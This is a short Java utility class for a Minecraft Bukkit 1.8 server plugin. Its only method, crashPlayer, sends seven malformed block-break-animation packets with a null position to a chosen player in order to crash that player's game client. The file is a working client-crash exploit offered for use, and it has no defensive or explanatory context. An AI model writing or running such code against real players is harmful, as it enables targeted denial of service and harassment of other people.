package de.redstoneraudi.mctools.utils;

import net.minecraft.server.v1_8_R3.PacketPlayOutBlockBreakAnimation;

import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

public class PlayerCrash {
	
	public static void crashPlayer(Player target) {
		
		PacketPlayOutBlockBreakAnimation packet = new PacketPlayOutBlockBreakAnimation(0, null, 0);
		((CraftPlayer)target).getHandle().playerConnection.sendPacket(packet);
		((CraftPlayer)target).getHandle().playerConnection.sendPacket(packet);
		((CraftPlayer)target).getHandle().playerConnection.sendPacket(packet);
		((CraftPlayer)target).getHandle().playerConnection.sendPacket(packet);
		((CraftPlayer)target).getHandle().playerConnection.sendPacket(packet);
		((CraftPlayer)target).getHandle().playerConnection.sendPacket(packet);
		((CraftPlayer)target).getHandle().playerConnection.sendPacket(packet);
		
	}

}
